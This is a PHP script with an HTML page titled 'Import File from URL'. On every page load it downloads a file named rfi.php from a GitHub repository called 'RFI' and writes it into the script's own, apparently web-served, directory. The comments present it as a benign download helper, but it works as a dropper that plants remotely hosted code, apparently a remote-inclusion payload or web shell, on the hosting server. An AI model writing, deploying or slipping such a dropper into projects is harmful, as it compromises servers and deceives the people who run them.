<?php

// Function to download a file from a URL and save it to the current directory
function importFileFromURL() {
    // Hardcoded URL of the file to download
    $fileURL = 'https://raw.githubusercontent.com/iamjackmorton/RFI/refs/heads/main/rfi.php';  // Replace with the URL of the file you want to download

    // Use file_get_contents to download the file contents
    $fileContents = file_get_contents($fileURL);

    // Check if file was downloaded successfully
    if ($fileContents === false) {
        echo "Error: Unable to download file from URL.";
        return false;
    }

    // Get the file name from the URL (basename() extracts the file name)
    $fileName = basename($fileURL);

    // Get the current directory where the PHP script is located
    $currentDirectory = __DIR__;  // Current directory of the script

    // Set the full path to save the file locally in the same directory
    $savePath = $currentDirectory . DIRECTORY_SEPARATOR . $fileName;

    // Write the contents to the save path
    $saveResult = file_put_contents($savePath, $fileContents);

    // Check if the file was saved successfully
    if ($saveResult === false) {
        echo "Error: Unable to save the file to the server.";
        return false;
    }

    echo "File downloaded and saved successfully: $fileName";
    return true;
}

// Call the function to download and save the file
importFileFromURL();

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Import File from URL</title>
</head>
<body>
    <h2>File Download Status</h2>
    <p>The file download and save process is handled automatically by the script.</p>
</body>
</html>
